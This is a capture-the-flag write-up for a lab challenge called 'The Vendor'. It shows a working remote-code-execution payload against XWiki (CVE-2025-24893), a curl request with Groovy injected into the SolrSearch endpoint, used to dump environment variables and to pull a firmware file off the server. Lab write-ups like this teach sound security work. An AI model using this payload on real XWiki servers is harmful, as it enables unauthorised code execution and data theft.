# Chapter 2: The Vendor (2 points)

Hi, emergency troubleshooter,

recent studies suggest that the intense heat and hard labor of solar
technicians often trigger strange, vivid dreams about the future of energetics.
Over the past few days, technicians have woken up night after night with the
same terrifying screams "Look, up in the sky! It’s a bird! It’s a plane! It’s
Superman! Let’s roast it anyway!".

Find out what’s going on, we need our technicians to stay sane.

Stay grounded!

* http://intro.falcon.powergrid.tcc/

## Hints

* Be sure you enter flag for correct chapter.
* In this realm, challenges should be conquered in a precise order, and to
  triumph over some, you'll need artifacts acquired from others - a unique
  twist that defies the norms of typical CTF challenges.
* Chapter haiku will lead you.

## Solution

We're already familiar with FALCON chapter carousel from [Chapter 1: Operator]

The second haiku says:

```text
Bits beneath the shell,
silent thief in circuits' sleep —
firmware leaves the nest.
```

The title leads to http://thevendor.falcon.powergrid.tcc/ where we can see
XWiki deployment.

A quick web search reveals CVE-2025-24893 and [RCE exploit for XWiki][exploit]
which shows how `SolrSearch` endpoint can be used to execute arbitrary code on
the server.

Running `env` command yields the flag (we can use e.g. `xq` to make XML output
more readable).

```
$ CMD=$(urlencode "env")
$ curl -s "http://thevendor.falcon.powergrid.tcc/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22$CMD%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d") | xq

(... output truncated ...)
  <br/>FLAG=FLAG{gwNd-0Klr-lsMW-YgZU}
(... output truncated ...)
```

We already have the flag, however, haiku suggests, that firmware should leave
the nest. If we explore the server a bit, we'll come across a firmware file
`/data/firmware/roostguard-firmware-0.9.bin`.

Extracting can be a little bit more complicated, but if we run `base64 /data/firmware/roostguard-firmware-0.9.bin`
using the method above, we should get base64-encoded output in our XML that is
extractable relatively easily.

The only trick seems to be that some base64 sequences are interpreted and
"translated" to HTML, so we'll need to replace `<em>` and `</em>` with `++`,
e.g. by piping the server output through `sed 's|</\?em>|++|g'`. Then we should
be able to reconstruct `roostguard-firmware-0.9.bin` [locally][fw] by running
`base64 -d` on the data we extracted from server response.

[Chapter 1: Operator]: ../falcon-1-operator
[exploit]: https://www.exploit-db.com/exploits/52136
[fw]: https://github.com/jandurovec/the-catch-2025/raw/refs/heads/main/falcon-2-the-vendor/roostguard-firmware-0.9.zip
